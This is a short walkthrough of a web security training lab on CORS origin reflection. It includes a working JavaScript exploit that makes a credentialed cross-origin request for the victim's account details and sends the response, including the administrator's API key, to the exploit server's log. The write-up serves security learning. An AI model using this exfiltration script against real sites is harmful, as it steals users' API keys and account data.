# CORS vulnerability with basic origin reflection
* This website has an insecure CORS configuration in that it trusts all origins.
	* To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solve when you successfully submit the administrator's API key.
	* You can log in yo your own account using the following credentials: `wiener: peter`

### 1. Enumerate the Website
* Log in as _Wiener_ and enumerte the request and response.
	* From `/accountDetails`, the API key can be found

* Also the response contains `Access-Control-Allow-Credentials`, which mean that the site may support CORS.

### 2. At the exploit server, Make a malicious HTML file to obtain Adminitstrator's API key
```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://ac491faf1ef7af32c0b950a4008c0072.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```
* Then, store the exploit.
### 3. Execute the exploit
* Execute the exploit by clicking "Deliver exploit to victim" and "Access log" button to see the result in log
	* From the log, some information of "Administrator" is found
